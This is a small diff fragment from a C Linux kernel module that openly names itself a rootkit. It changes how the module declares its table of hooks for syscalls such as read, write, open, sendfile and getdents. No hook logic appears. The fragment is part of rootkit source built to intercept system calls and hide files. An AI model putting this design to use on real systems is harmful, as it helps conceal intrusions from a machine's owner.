@@ -22,9 +22,8 @@ MODULE_VERSION("0.1");
 
 static sysfun_t p_orig_sysfuns[__NR_syscalls] = { NULL };
 
-static hook_t p_syscall_hooks[] = {
-    SYSCALL_HOOKS(read, write, open, pread64, sendfile, getdents, getdents64),
-};
+static hook_t p_syscall_hooks[] =
+    SYSCALL_HOOKS(read, write, open, pread64, sendfile, getdents, getdents64);
 
 static int __init rootkit_init(void)
 {
